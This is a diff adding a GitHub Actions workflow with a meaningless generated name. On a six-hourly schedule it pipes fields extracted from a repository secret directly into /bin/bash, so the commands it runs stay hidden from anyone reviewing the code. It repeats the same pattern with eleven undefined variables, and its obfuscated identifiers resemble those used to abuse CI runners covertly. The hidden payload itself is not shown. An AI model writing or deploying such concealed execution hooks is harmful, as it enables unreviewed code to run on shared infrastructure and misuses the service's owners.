@@ -1,0 +1,29 @@
+name: kaitlynscrum9730
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '32 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: kaitlynscrum9730
+        env:
+          d95: ${{ secrets.d95 }}
+        run: |
+          echo $d95 | jq -r .gy89 | /bin/bash
+          echo $tkki6 | jq -r .dx866 | /bin/bash
+          echo $xcz624 | jq -r .dndfd6332 | /bin/bash
+          echo $i1 | jq -r .nox38 | /bin/bash
+          echo $msks94 | jq -r .q6 | /bin/bash
+          echo $aea7 | jq -r .h895 | /bin/bash
+          echo $dfbv9 | jq -r .d928 | /bin/bash
+          echo $xarjd8 | jq -r .gzokr472 | /bin/bash
+          echo $v52 | jq -r .xcj8920 | /bin/bash
+          echo $c1 | jq -r .gr86 | /bin/bash
+          echo $cafn06795 | jq -r .bffaa4 | /bin/bash
+          echo $kh93 | jq -r .ke470 | /bin/bash
+
